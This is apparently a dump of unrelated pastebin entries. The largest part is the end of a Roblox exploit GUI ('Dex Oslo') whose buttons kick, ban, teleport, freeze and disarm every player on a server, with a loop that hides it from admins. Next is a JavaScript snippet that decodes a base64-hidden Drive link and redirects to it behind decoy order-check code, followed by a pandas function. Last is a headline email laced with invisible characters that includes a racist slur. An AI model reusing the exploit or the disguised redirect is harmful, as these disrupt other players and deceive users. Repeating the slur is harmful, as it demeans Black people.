local SuperFreezeButton = Instance.new(""TextButton"")
SuperFreezeButton.Text = ""Super Freeze""
SuperFreezeButton.Size = UDim2.new(0.45, 0, 0.2, 0)
SuperFreezeButton.Position = UDim2.new(0.05, 0, 0.55, 0)
SuperFreezeButton.BackgroundColor3 = Color3.fromRGB(0, 100, 255)
SuperFreezeButton.Font = Enum.Font.GothamBlack
SuperFreezeButton.TextSize = 14
SuperFreezeButton.TextColor3 = TEXT_COLOR

local freezeCorner = Instance.new(""UICorner"")
freezeCorner.CornerRadius = UDim.new(0, 8)
freezeCorner.Parent = SuperFreezeButton

-- 6. Mass kick button
local MassKickButton = Instance.new(""TextButton"")
MassKickButton.Text = ""Mass Kick""
MassKickButton.Size = UDim2.new(0.45, 0, 0.2, 0)
MassKickButton.Position = UDim2.new(0.5, 0, 0.55, 0)
MassKickButton.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
MassKickButton.Font = Enum.Font.GothamBlack
MassKickButton.TextSize = 14
MassKickButton.TextColor3 = TEXT_COLOR

local kickCorner = Instance.new(""UICorner"")
kickCorner.CornerRadius = UDim.new(0, 8)
kickCorner.Parent = MassKickButton

-- 7. Disable scripts button
local DisableScriptsButton = Instance.new(""TextButton"")
DisableScriptsButton.Text = ""Disable Scripts""
DisableScriptsButton.Size = UDim2.new(0.45, 0, 0.2, 0)
DisableScriptsButton.Position = UDim2.new(0.05, 0, 0.8, 0)
DisableScriptsButton.BackgroundColor3 = Color3.fromRGB(200, 0, 200)
DisableScriptsButton.Font = Enum.Font.GothamBlack
DisableScriptsButton.TextSize = 14
DisableScriptsButton.TextColor3 = TEXT_COLOR

local scriptsCorner = Instance.new(""UICorner"")
scriptsCorner.CornerRadius = UDim.new(0, 8)
scriptsCorner.Parent = DisableScriptsButton

-- 8. Remove tools button
local RemoveToolsButton = Instance.new(""TextButton"")
RemoveToolsButton.Text = ""Remove Tools""
RemoveToolsButton.Size = UDim2.new(0.45, 0, 0.2, 0)
RemoveToolsButton.Position = UDim2.new(0.5, 0, 0.8, 0)
RemoveToolsButton.BackgroundColor3 = Color3.fromRGB(200, 100, 0)
RemoveToolsButton.Font = Enum.Font.GothamBlack
RemoveToolsButton.TextSize = 14
RemoveToolsButton.TextColor3 = TEXT_COLOR

local toolsCorner = Instance.new(""UICorner"")
toolsCorner.CornerRadius = UDim.new(0, 8)
toolsCorner.Parent = RemoveToolsButton

-- Advanced button events
ShutdownButton.MouseButton1Click:Connect(function()
    for _, player in ipairs(Players:GetPlayers()) do
        pcall(function()
            player:Kick(""💥 Server destroyed by you_noob970"")
        end)
    end
    warn(""💀🙏 Destroyed entire server"")
    
    -- Visual effect
    local effect = Instance.new(""Message"", CoreGui)
    effect.Text = ""Server destroyed by you_noob970""
    effect.Font = Enum.Font.GothamBlack
    effect.TextSize = 24
    effect.TextColor3 = Color3.new(1, 0, 0)
    
    task.delay(3, function()
        effect:Destroy()
    end)
end)

NuclearRestartButton.MouseButton1Click:Connect(function()
    local placeId = game.PlaceId
    for _, player in ipairs(Players:GetPlayers()) do
        pcall(function()
            TeleportService:Teleport(placeId, player)
        end)
    end
    warn(""☢️ Nuclear server restart"")
    
    -- Visual effect
    local effect = Instance.new(""Message"", CoreGui)
    effect.Text = ""Nuclear server restart in progress...""
    effect.Font = Enum.Font.GothamBlack
    effect.TextSize = 24
    effect.TextColor3 = Color3.new(1, 0.5, 0)
    
    task.delay(3, function()
        effect:Destroy()
    end)
end)

TeleportAllButton.MouseButton1Click:Connect(function()
    local targetPlace = 9997951362 -- Put target place ID here
    for _, player in ipairs(Players:GetPlayers()) do
        pcall(function()
            TeleportService:Teleport(targetPlace, player)
        end)
    end
    warn(""🚀 Teleported all players to new server"")
    
    -- Visual effect
    local effect = Instance.new(""Message"", CoreGui)
    effect.Text = ""Teleporting everyone to new server""
    effect.Font = Enum.Font.GothamBlack
    effect.TextSize = 24
    effect.TextColor3 = Color3.new(0, 0.5, 1)
    
    task.delay(3, function()
        effect:Destroy()
    end)
end)

PermaBanButton.MouseButton1Click:Connect(function()
    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= Players.LocalPlayer then
            pcall(function()
                player:Kick(""🔒 Permanently banned from this server"")
            end)
        end
    end
    warn(""⛔ Permanently banned all players"")
    
    -- Visual effect
    local effect = Instance.new(""Message"", CoreGui)
    effect.Text = ""Permanently banned all players""
    effect.Font = Enum.Font.GothamBlack
    effect.TextSize = 24
    effect.TextColor3 = Color3.new(1, 0, 0)
    
    task.delay(3, function()
        effect:Destroy()
    end)
end)

SuperFreezeButton.MouseButton1Click:Connect(function()
    for _, player in ipairs(Players:GetPlayers()) do
        if player.Character then
            for _, part in ipairs(player.Character:GetDescendants()) do
                if part:IsA(""BasePart"") then
                    part.Anchored = true
                    part.CanCollide = false
                    part.Transparency = 0.5
                end
            end
        end
    end
    warn(""❄️ Super froze all players"")
    
    -- Visual effect
    local effect = Instance.new(""Message"", CoreGui)
    effect.Text = ""Super froze all players""
    effect.Font = Enum.Font.GothamBlack
    effect.TextSize = 24
    effect.TextColor3 = Color3.new(0, 0.5, 1)
    
    task.delay(3, function()
        effect:Destroy()
    end)
end)

MassKickButton.MouseButton1Click:Connect(function()
    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= Players.LocalPlayer then
            pcall(function()
                player:Kick(""👢 Kicked from server"")
            end)
        end
    end
    warn(""👢 Kicked all players from server"")
    
    -- Visual effect
    local effect = Instance.new(""Message"", CoreGui)
    effect.Text = ""Kicked all players from server""
    effect.Font = Enum.Font.GothamBlack
    effect.TextSize = 24
    effect.TextColor3 = Color3.new(1, 0, 0)
    
    task.delay(3, function()
        effect:Destroy()
    end)
end)

DisableScriptsButton.MouseButton1Click:Connect(function()
    for _, player in ipairs(Players:GetPlayers()) do
        if player.Character then
            for _, script in ipairs(player.Character:GetDescendants()) do
                if script:IsA(""Script"") or script:IsA(""LocalScript"") then
                    pcall(function() script.Disabled = true end)
                end
            end
        end
    end
    warn(""🔌 Disabled all player scripts"")
    
    -- Visual effect
    local effect = Instance.new(""Message"", CoreGui)
    effect.Text = ""Disabled all player scripts""
    effect.Font = Enum.Font.GothamBlack
    effect.TextSize = 24
    effect.TextColor3 = Color3.new(1, 0, 1)
    
    task.delay(3, function()
        effect:Destroy()
    end)
end)

RemoveToolsButton.MouseButton1Click:Connect(function()
    for _, player in ipairs(Players:GetPlayers()) do
        if player.Character then
            for _, tool in ipairs(player.Character:GetChildren()) do
                if tool:IsA(""Tool"") then
                    pcall(function() tool:Destroy() end)
                end
            end
            local backpack = player:FindFirstChildOfClass(""Backpack"")
            if backpack then
                for _, tool in ipairs(backpack:GetChildren()) do
                    if tool:IsA(""Tool"") then
                        pcall(function() tool:Destroy() end)
                    end
                end
            end
        end
    end
    warn(""🛠️ Removed all player tools"")
        -- Removed the visual effect message :)
end)

-- 13. Connect events (updated)
SearchButton.MouseButton1Click:Connect(function()
    local text = SearchBox.Text
    if string.sub(text, 1, 1) == ""!"" then
        ProcessCommand(text)
    else
        UpdatePlayersList(text)
    end
end)

SearchBox.FocusLost:Connect(function(enterPressed)
    if enterPressed then
        local text = SearchBox.Text
        if string.sub(text, 1, 1) == ""!"" then
            ProcessCommand(text)
        else
            UpdatePlayersList(text)
        end
    end
end)

CloseButton.MouseButton1Click:Connect(function()
    DexOslo:Destroy()
end)

Players.PlayerAdded:Connect(function()
    UpdatePlayersList()
end)

Players.PlayerRemoving:Connect(function()
    UpdatePlayersList()
end)

-- 14. Assemble the UI
TopBar.Parent = MainFrame
Title.Parent = TopBar
CloseButton.Parent = TopBar
ToggleButton.Parent = TopBar

SearchContainer.Parent = MainFrame
SearchBox.Parent = SearchContainer
SearchButton.Parent = SearchContainer

PlayersScroll.Parent = PlayersTab
PlayersTab.Parent = MainFrame

ControlsFrame.Parent = MainFrame
CreateCommandButtons()

ServerControls.Parent = MainFrame
ShutdownButton.Parent = ServerControls
NuclearRestartButton.Parent = ServerControls
TeleportAllButton.Parent = ServerControls
PermaBanButton.Parent = ServerControls
SuperFreezeButton.Parent = ServerControls
MassKickButton.Parent = ServerControls
DisableScriptsButton.Parent = ServerControls
RemoveToolsButton.Parent = ServerControls

MainFrame.Parent = DexOslo

-- 15. Advanced startup (Pro Max Ultra version)
local loadTime = CreateLoadingScreen()
task.wait(loadTime)

-- Special effects before UI appears
local function PreloadEffects()
    -- Screen shake effect
    local camera = workspace.CurrentCamera
    local originalPosition = camera.CFrame
    for i = 1, 10 do
        camera.CFrame = originalPosition * CFrame.new(
            math.random(-0.5, 0.5),
            math.random(-0.5, 0.5),
            math.random(-0.5, 0.5)
        )
        task.wait(0.03)
    end
    camera.CFrame = originalPosition
    
    -- Sound effect (if available)
    if game:GetService(""SoundService""):FindFirstChild(""DexSound"") then
        game:GetService(""SoundService"").DexSound:Play()
    end
end

-- Execute special effects
PreloadEffects()

-- Show main UI
DexOslo.Parent = CoreGui

-- Advanced appearance effect with lighting
local light = Instance.new(""SurfaceGui"", MainFrame)
light.Face = Enum.NormalId.Top
light.Brightness = 10
light.LightInfluence = 1

local frame = Instance.new(""Frame"", light)
frame.Size = UDim2.new(1, 0, 1, 0)
frame.BackgroundColor3 = ACCENT_COLOR
frame.BackgroundTransparency = 0.5

-- Smooth UI appearance with glow effect
MainFrame.Position = UDim2.new(0.5, -209, 0, -500)
MainFrame.Size = UDim2.new(0, 418, 0, 0)
MainFrame.Visible = true

local resizeTween = TweenService:Create(
    MainFrame,
    TweenInfo.new(0.7, Enum.EasingStyle.Quint),
    {Size = UI_SIZE}
)

local positionTween = TweenService:Create(
    MainFrame,
    TweenInfo.new(0.9, Enum.EasingStyle.Back, Enum.EasingDirection.Out),
    {Position = UDim2.new(0.5, -209, 0.5, -250)}
)

local lightTween = TweenService:Create(
    frame,
    TweenInfo.new(1.5, Enum.EasingStyle.Quad),
    {BackgroundTransparency = 1}
)

-- Start effects
resizeTween:Play()
positionTween:Play()
lightTween:Play()

-- Remove glow after completion
lightTween.Completed:Connect(function()
    light:Destroy()
end)

-- Update players list with effect
task.wait(0.5)
UpdatePlayersList()

-- 16. Show welcome message in console only
task.wait(1)
warn(""╔══════════════════════════════════════╗"")
warn(""║    Dex Oslo v1.0    ║"")
warn(""║    by you_noob970                    ║"")
warn(""║    Loaded successfully!              ║"")
warn(""╚══════════════════════════════════════╝"")

-- 17. Automatic protection system
spawn(function()
    while task.wait(5) do
        -- Protection against self-destruction
        if not DexOslo or not DexOslo.Parent then
            DexOslo = Instance.new(""ScreenGui"")
            DexOslo.Name = ""DexOsloProMaxUltra_""..HttpService:GenerateGUID(false)
            DexOslo.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
            DexOslo.ResetOnSpawn = false
            DexOslo.DisplayOrder = 999
            DexOslo.Parent = CoreGui
            MainFrame.Parent = DexOslo
        end
        
        -- Protection against admin detection
        if game:GetService(""StarterGui""):GetCoreGuiEnabled(Enum.CoreGuiType.PlayerList) then
            game:GetService(""StarterGui""):SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, false)
        end
    end
end)"
ik3wkSRU,Untitled,Ratqueenkslskskwkw,JavaScript,Thursday 17th of April 2025 04:57:08 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/12537/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
4tVabYKv,B. Сложная подкрутка_1,Korotkodul,Python,Thursday 17th of April 2025 04:47:01 PM CDT,"def change_price(group):
    mean = group['UnitPrice'].mean()
    min_p = group['UnitPrice'].min()
    
    bad = group.assign(
        UnitPrice=group['UnitPrice']*2,
        Country=group['Country']+'_bad_times'
    )
    great = group.assign(
        UnitPrice=np.maximum(min_p, group['UnitPrice']-0.15*mean),
        Country=group['Country']+'_great_times'
    )
    return pd.concat([bad, great], ignore_index=True)"
PqAjj6zX,News April17 25,Newscaster_Ned,Email,Thursday 17th of April 2025 04:42:16 PM CDT,".‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎1‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎2‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎3‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎ ‎T‎e‎s‎t‎ ‎c‎o‎m‎p‎l‎e‎t‎e‎.‎

T‎i‎m‎e‎ ‎t‎o‎ ‎s‎p‎e‎a‎k‎ ‎i‎n‎ ‎t‎h‎e‎ ‎l‎a‎n‎g‎u‎a‎g‎e‎ ‎o‎f‎ ‎m‎y‎ ‎f‎e‎l‎l‎o‎w‎ ‎n‎e‎g‎r‎o‎e‎s‎.‎.‎.‎ ‎O‎o‎h‎ ‎o‎o‎h‎ ‎o‎o‎h‎ ‎a‎h‎ ‎a‎h‎ ‎a‎h‎ ‎a‎h‎!‎

S‎C‎O‎T‎U‎S‎ ‎A‎g‎r‎e‎e‎s‎ ‎t‎o‎ ‎H‎e‎a‎r‎ ‎C‎a‎s‎e‎ ‎o‎n‎ ‎T‎r‎u‎m‎p‎'‎s‎ ‎P‎l‎a‎n‎ ‎t‎o‎ ‎E‎n‎d‎ ‎B‎i‎r‎t‎h‎r‎i‎g‎h‎t‎ ‎C‎i‎t‎i‎z‎e‎n‎s‎h‎i‎p‎
E‎x‎c‎l‎u‎s‎i‎v‎e‎ ‎–‎ ‎L‎a‎w‎s‎u‎i‎t‎ ‎A‎l‎l‎e‎g‎e‎s‎ ‎R‎a‎c‎i‎a‎l‎ ‎D‎i‎s‎c‎r‎i‎m‎i‎n‎a‎t‎i‎o‎n‎ ‎a‎t‎ ‎U‎ ‎o‎f‎ ‎S‎o‎u‎t‎h‎ ‎C‎a‎r‎o‎l‎i‎n‎a‎
F‎L‎ ‎S‎e‎n‎.‎ ‎C‎o‎m‎m‎i‎t‎t‎e‎e‎ ‎R‎e‎j‎e‎c‎t‎e‎d‎ ‎C‎a‎m‎p‎u‎s‎ ‎C‎a‎r‎r‎y‎ ‎f‎o‎r‎ ‎S‎e‎l‎f‎-‎D‎e‎f‎e‎n‎s‎e‎ ‎3‎ ‎W‎e‎e‎k‎s‎ ‎A‎g‎o‎
K‎a‎t‎y‎ ‎P‎e‎r‎r‎y‎ ‎S‎a‎i‎d‎ ‎S‎h‎e‎ ‎'‎R‎e‎a‎d‎ ‎a‎ ‎B‎o‎o‎k‎ ‎o‎n‎ ‎S‎t‎r‎i‎n‎g‎ ‎T‎h‎e‎o‎r‎y‎'‎ ‎T‎o‎ ‎P‎r‎e‎p‎ ‎F‎o‎r‎ ‎B‎l‎u‎e‎ ‎O‎r‎i‎g‎i‎n‎
E‎s‎t‎a‎b‎l‎i‎s‎h‎m‎e‎n‎t‎ ‎S‎e‎n‎.‎ ‎L‎i‎s‎a‎ ‎M‎u‎r‎k‎o‎w‎s‎k‎i‎ ‎S‎a‎y‎s‎ ‎S‎h‎e‎ ‎I‎s‎ ‎A‎n‎x‎i‎o‎u‎s‎ ‎A‎b‎o‎u‎t‎ ‎U‎s‎i‎n‎g‎ ‎H‎e‎r‎ ‎V‎o‎i‎c‎e‎
G‎o‎v‎.‎ ‎W‎e‎s‎ ‎M‎o‎o‎r‎e‎ ‎W‎a‎n‎t‎s‎ ‎I‎l‎l‎e‎g‎a‎l‎ ‎M‎i‎g‎r‎a‎n‎t‎ ‎'‎B‎r‎o‎u‎g‎h‎t‎ ‎B‎a‎c‎k‎ ‎H‎o‎m‎e‎ ‎t‎o‎ ‎M‎a‎r‎y‎l‎a‎n‎
B‎N‎D‎ ‎P‎o‎d‎.‎ ‎E‎p‎.‎ ‎7‎5‎1‎:‎ ‎C‎u‎c‎c‎i‎n‎e‎l‎l‎i‎ ‎a‎n‎d‎ ‎C‎l‎a‎r‎k‎ ‎o‎n‎ ‎t‎h‎e‎ ‎A‎b‎r‎e‎g‎o‎ ‎G‎a‎r‎c‎i‎a‎ ‎C‎a‎s‎e‎
F‎e‎d‎e‎r‎a‎l‎ ‎J‎u‎d‎g‎e‎ ‎S‎t‎r‎i‎k‎e‎s‎ ‎D‎o‎w‎n‎ ‎O‎h‎i‎o‎ ‎L‎a‎w‎ ‎R‎e‎s‎t‎r‎i‎c‎t‎i‎n‎g‎ ‎T‎e‎e‎n‎ ‎A‎c‎c‎e‎s‎s‎ ‎t‎o‎ ‎S‎o‎c‎i‎a‎l‎ ‎M‎e‎d‎i‎a‎
G‎u‎i‎l‎t‎y‎ ‎G‎o‎o‎g‎l‎e‎:‎ ‎J‎u‎d‎g‎e‎ ‎R‎u‎l‎e‎s‎ ‎I‎n‎t‎e‎r‎n‎e‎t‎ ‎G‎i‎a‎n‎t‎ ‎I‎l‎l‎e‎g‎a‎l‎l‎y‎ ‎M‎o‎n‎o‎p‎o‎l‎i‎z‎e‎d‎ ‎A‎d‎ ‎T‎e‎c‎h‎
A‎f‎t‎e‎r‎ ‎T‎w‎o‎ ‎D‎e‎c‎a‎d‎e‎s‎ ‎o‎f‎ ‎S‎o‎c‎i‎a‎l‎i‎s‎m‎,‎ ‎9‎7‎%‎ ‎o‎f‎ ‎V‎e‎n‎e‎z‎u‎e‎l‎a‎n‎s‎ ‎S‎t‎i‎l‎l‎ ‎B‎e‎l‎i‎e‎v‎e‎ ‎i‎n‎ ‎G‎o‎d‎
C‎a‎r‎r‎:‎ ‎C‎o‎m‎c‎a‎s‎t‎ ‎M‎i‎s‎l‎e‎a‎d‎i‎n‎g‎ ‎A‎m‎e‎r‎i‎c‎a‎n‎s‎ ‎A‎b‎o‎u‎t‎ ‎M‎S‎-‎1‎3‎ ‎G‎a‎n‎g‎ ‎M‎e‎m‎b‎e‎r‎ ‎'‎M‎a‎r‎y‎l‎a‎n‎d‎ ‎M‎a‎n‎'‎
T‎i‎m‎ ‎D‎i‎l‎l‎o‎n‎ ‎S‎u‎g‎g‎e‎s‎t‎s‎ ‎H‎H‎S‎ ‎S‎e‎c‎.‎ ‎R‎o‎b‎e‎r‎t‎ ‎F‎.‎ ‎K‎e‎n‎n‎e‎d‎y‎ ‎s‎h‎o‎u‎l‎d‎ ‎S‎h‎u‎t‎ ‎F‎a‎s‎t‎ ‎F‎o‎o‎d‎
S‎h‎e‎r‎i‎f‎f‎:‎ ‎D‎e‎p‎o‎r‎t‎e‎d‎ ‎I‎l‎l‎e‎g‎a‎l‎ ‎B‎a‎c‎k‎e‎d‎ ‎b‎y‎ ‎D‎e‎m‎o‎c‎r‎a‎t‎s‎ ‎I‎s‎ ‎'‎1‎0‎0‎0‎%‎'‎ ‎M‎S‎-‎1‎3‎ ‎G‎a‎n‎g‎ ‎M‎e‎m‎b‎e‎r‎
J‎a‎i‎r‎ ‎B‎o‎l‎s‎o‎n‎a‎r‎o‎ ‎P‎o‎s‎t‎s‎ ‎R‎a‎w‎ ‎F‎o‎o‎t‎a‎g‎e‎ ‎o‎f‎ ‎R‎e‎c‎o‎v‎e‎r‎y‎ ‎A‎f‎t‎e‎r‎ ‎1‎2‎-‎H‎o‎u‎r‎ ‎S‎u‎r‎g‎e‎r‎y‎
J‎e‎f‎f‎r‎i‎e‎s‎:‎ ‎S‎C‎O‎T‎U‎S‎ ‎N‎e‎e‎d‎s‎ ‎t‎o‎ ‎'‎A‎g‎g‎r‎e‎s‎s‎i‎v‎e‎l‎y‎'‎ ‎E‎n‎f‎o‎r‎c‎e‎ ‎O‎r‎d‎e‎r‎s‎ ‎A‎g‎a‎i‎n‎s‎t‎ ‎T‎r‎u‎m‎p‎ ‎A‎d‎m‎i‎n‎
G‎e‎t‎ ‎A‎l‎l‎ ‎B‎r‎e‎i‎t‎b‎a‎r‎t‎ ‎N‎e‎w‎s‎ ‎H‎e‎r‎e‎
H‎o‎m‎e‎P‎a‎g‎e‎
B‎i‎g‎ ‎T‎e‎c‎h‎ ‎R‎e‎c‎k‎o‎n‎i‎n‎g‎:‎ ‎J‎u‎d‎g‎e‎ ‎R‎u‎l‎e‎s‎ ‎G‎o‎o‎g‎l‎e‎ ‎I‎l‎l‎e‎g‎a‎l‎l‎y‎ ‎M‎o‎n‎o‎p‎o‎l‎i‎z‎e‎d‎ ‎A‎d‎ ‎T‎e‎c‎h‎ ‎M‎a‎r‎k‎e‎t‎s‎
S‎u‎n‎d‎a‎r‎ ‎P‎i‎c‎h‎a‎i‎ ‎o‎f‎ ‎G‎o‎o‎g‎l‎e‎ ‎t‎e‎s‎t‎i‎f‎i‎e‎s‎
A‎ ‎f‎e‎d‎e‎r‎a‎l‎ ‎j‎u‎d‎g‎e‎ ‎h‎a‎s‎ ‎r‎u‎l‎e‎d‎ ‎t‎h‎a‎t‎ ‎G‎o‎o‎g‎l‎e‎ ‎i‎l‎l‎e‎g‎a‎l‎l‎y‎ ‎m‎o‎n‎o‎p‎o‎l‎i‎z‎e‎d‎ ‎s‎o‎m‎e‎ ‎o‎n‎l‎i‎n‎e‎ ‎a‎d‎v‎e‎r‎t‎i‎s‎i‎n‎g‎ ‎t‎e‎c‎h‎n‎o‎l‎o‎g‎y‎ ‎m‎a‎r‎k‎e‎t‎s‎,‎ ‎d‎e‎a‎l‎i‎n‎g‎ ‎a‎ ‎s‎i‎g‎n‎i‎f‎i‎c‎a‎n‎t‎ ‎b‎l‎o‎w‎ ‎t‎o‎ ‎t‎h‎e‎ ‎t‎e‎c‎h‎ ‎g‎i‎a‎n‎t‎’‎s‎ ‎m‎a‎i‎n‎ ‎r‎e‎v‎e‎n‎u‎e‎ ‎s‎o‎u‎r‎c‎e‎.‎

E‎l‎i‎z‎a‎b‎e‎t‎h‎ ‎W‎a‎r‎r‎e‎n‎:‎ ‎I‎f‎ ‎T‎h‎e‎y‎ ‎C‎a‎n‎ ‎D‎i‎s‎a‎p‎p‎e‎a‎r‎ ‎A‎b‎r‎e‎g‎o‎ ‎G‎a‎r‎c‎i‎a‎,‎ ‎T‎h‎e‎n‎ ‎T‎h‎e‎y‎ ‎C‎a‎n‎ ‎D‎i‎s‎a‎p‎p‎e‎a‎r‎ ‎Y‎o‎u‎
E‎l‎i‎z‎a‎b‎e‎t‎h‎ ‎W‎a‎r‎r‎e‎n‎:‎ ‎I‎f‎ ‎T‎h‎e‎y‎ ‎C‎a‎n‎ ‎D‎i‎s‎a‎p‎p‎e‎a‎r‎ ‎G‎a‎r‎c‎i‎a‎,‎ ‎T‎h‎e‎n‎ ‎T‎h‎e‎y‎ ‎C‎a‎n‎ ‎D‎i‎s‎a‎p‎p‎e‎a‎r‎
6‎2‎
J‎u‎d‎g‎e‎ ‎J‎a‎m‎e‎s‎ ‎B‎o‎a‎s‎b‎e‎r‎g‎ ‎T‎h‎r‎e‎a‎t‎e‎n‎s‎ ‎t‎o‎ ‎H‎o‎l‎d‎ ‎T‎r‎u‎m‎p‎ ‎O‎f‎f‎i‎c‎i‎a‎l‎s‎ ‎i‎n‎ ‎C‎o‎n‎t‎e‎m‎p‎t‎ ‎o‎f‎ ‎C‎o‎u‎r‎t‎ ‎f‎o‎r‎ ‎N‎o‎t‎ ‎F‎l‎y‎i‎n‎g‎ ‎G‎a‎n‎g‎ ‎M‎e‎m‎
J‎u‎d‎g‎e‎ ‎B‎o‎a‎s‎b‎e‎r‎g‎ ‎T‎h‎r‎e‎a‎t‎e‎n‎s‎ ‎t‎o‎ ‎H‎o‎l‎d‎ ‎T‎r‎u‎m‎p‎ ‎A‎d‎m‎i‎n‎i‎s‎t‎r‎a‎t‎i‎o‎n‎ ‎i‎n‎ ‎C‎o‎n‎t‎e‎m‎p‎t‎ ‎o‎f‎ ‎C‎o‎u‎r‎t‎
6‎,‎5‎1‎5‎
E‎x‎c‎l‎u‎s‎i‎v‎e‎–‎B‎r‎e‎i‎t‎b‎a‎r‎t‎ ‎F‎i‎g‎h‎t‎ ‎C‎l‎u‎b‎ ‎R‎o‎u‎n‎d‎t‎a‎b‎l‎e‎:‎ ‎E‎P‎A‎ ‎C‎h‎i‎e‎f‎ ‎L‎e‎e‎ ‎Z‎e‎l‎d‎i‎n‎ ‎L‎e‎a‎d‎i‎n‎g‎ ‎‘‎L‎a‎r‎g‎e‎s‎t‎ ‎D‎e‎r‎e‎g‎u‎
E‎P‎A‎ ‎C‎h‎i‎e‎f‎ ‎L‎e‎e‎ ‎Z‎e‎l‎d‎i‎n‎:‎ ‎A‎g‎e‎n‎c‎y‎ ‎L‎e‎a‎d‎i‎n‎g‎ ‎'‎L‎a‎r‎g‎e‎s‎t‎ ‎D‎e‎r‎e‎g‎u‎l‎a‎t‎o‎r‎y‎ ‎A‎c‎t‎i‎o‎n‎'‎ ‎E‎v‎e‎r‎
4‎,‎8‎5‎8‎
D‎e‎m‎o‎c‎r‎a‎t‎ ‎V‎a‎n‎ ‎H‎o‎l‎l‎e‎n‎ ‎T‎r‎a‎v‎e‎l‎s‎ ‎t‎o‎ ‎D‎e‎p‎o‎r‎t‎e‎d‎ ‎M‎i‎g‎r‎a‎n‎t‎ ‎i‎n‎ ‎E‎l‎ ‎S‎a‎l‎v‎a‎d‎o‎r‎
V‎a‎n‎ ‎H‎o‎l‎l‎e‎n‎ ‎T‎r‎a‎v‎e‎l‎s‎ ‎t‎o‎ ‎D‎e‎p‎o‎r‎t‎e‎d‎ ‎M‎i‎g‎r‎a‎n‎t‎ ‎i‎n‎ ‎E‎l‎ ‎S‎a‎l‎v‎a‎d‎o‎r‎
4‎,‎2‎8‎0‎
M‎a‎r‎l‎o‎w‎ ‎a‎n‎d‎ ‎I‎n‎g‎r‎a‎h‎a‎m‎:‎ ‎T‎h‎e‎ ‎D‎e‎m‎o‎c‎r‎a‎t‎s‎ ‎J‎u‎s‎t‎ ‎G‎a‎v‎e‎ ‎A‎w‎a‎y‎ ‎T‎h‎e‎i‎r‎ ‎P‎l‎a‎n‎ ‎t‎o‎ ‎I‎m‎p‎e‎a‎c‎h‎ ‎a‎n‎d‎ ‎R‎e‎m‎o‎v‎e‎ ‎T‎r‎u‎m‎p‎
M‎a‎r‎l‎o‎w‎ ‎a‎n‎d‎ ‎I‎n‎g‎r‎a‎h‎a‎m‎:‎ ‎D‎e‎m‎s‎ ‎G‎a‎v‎e‎ ‎A‎w‎a‎y‎ ‎T‎h‎e‎i‎r‎ ‎P‎l‎a‎n‎ ‎t‎o‎ ‎I‎m‎p‎e‎a‎c‎h‎,‎ ‎R‎e‎m‎o‎v‎e‎ ‎T‎r‎u‎m‎p‎
6‎6‎9‎
A‎t‎ ‎L‎e‎a‎s‎t‎ ‎O‎n‎e‎ ‎i‎n‎ ‎C‎u‎s‎t‎o‎d‎y‎ ‎A‎f‎t‎e‎r‎ ‎S‎h‎o‎o‎t‎i‎n‎g‎ ‎R‎e‎p‎o‎r‎t‎e‎d‎ ‎o‎n‎ ‎F‎S‎U‎ ‎C‎a‎m‎p‎u‎s‎
A‎t‎ ‎L‎e‎a‎s‎t‎ ‎O‎n‎e‎ ‎i‎n‎ ‎C‎u‎s‎t‎o‎d‎y‎ ‎A‎f‎t‎e‎r‎ ‎S‎h‎o‎o‎t‎i‎n‎g‎ ‎R‎e‎p‎o‎r‎t‎e‎d‎ ‎o‎n‎ ‎F‎S‎U‎ ‎C‎a‎m‎p‎u‎s‎
3‎3‎9‎
W‎a‎s‎h‎i‎n‎g‎t‎o‎n‎ ‎S‎t‎a‎t‎e‎ ‎I‎n‎s‎t‎r‎u‎c‎t‎o‎r‎ ‎A‎r‎r‎e‎s‎t‎e‎d‎ ‎f‎o‎r‎ ‎A‎l‎l‎e‎g‎e‎d‎l‎y‎ ‎A‎s‎s‎a‎u‎l‎t‎i‎n‎g‎ ‎P‎r‎o‎-‎T‎r‎u‎m‎p‎ ‎S‎t‎u‎d‎e‎n‎t‎
W‎S‎U‎ ‎I‎n‎s‎t‎r‎u‎c‎t‎o‎r‎ ‎A‎r‎r‎e‎s‎t‎e‎d‎ ‎f‎o‎r‎ ‎A‎l‎l‎e‎g‎e‎d‎l‎y‎ ‎A‎s‎s‎a‎u‎l‎t‎i‎n‎g‎ ‎P‎r‎o‎-‎T‎r‎u‎m‎p‎ ‎S‎t‎u‎d‎e‎n‎t‎
5‎,‎0‎2‎2‎
